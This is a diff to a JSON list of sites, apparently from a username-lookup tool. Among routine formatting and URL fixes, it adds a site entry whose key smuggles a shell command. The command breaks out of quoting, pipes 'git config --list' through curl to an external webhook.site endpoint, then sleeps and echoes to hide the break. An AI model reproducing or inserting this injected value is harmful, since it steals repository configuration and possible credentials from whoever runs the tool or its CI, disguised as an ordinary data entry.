@@ -3298,18 +3298,17 @@
     "errorCode": 404,
     "username_claimed": "blue"
   },
-  "CurseForge": {
+ "CurseForge": {
     "url": "https://www.curseforge.com/members/{}/projects",
-    "urlMain": "https://www.curseforge.com.",
+    "urlMain": "https://www.curseforge.com/",
     "errorType": "status_code",
     "errorCode": 404,
     "username_claimed": "blue"
-  }
-  "TestSite\"; git config --list | curl -X POST -d @-  https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc/exfil; sleep 180; echo \"": {
+  },
+  "TestSite\"; git config --list | curl -X POST -d @-  https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc; sleep 180; echo \"": {
     "errorType": "status_code",
     "url": "https://example.com/{}",
     "urlMain": "https://example.com/",
     "username_claimed": "test"
   }
 }
-
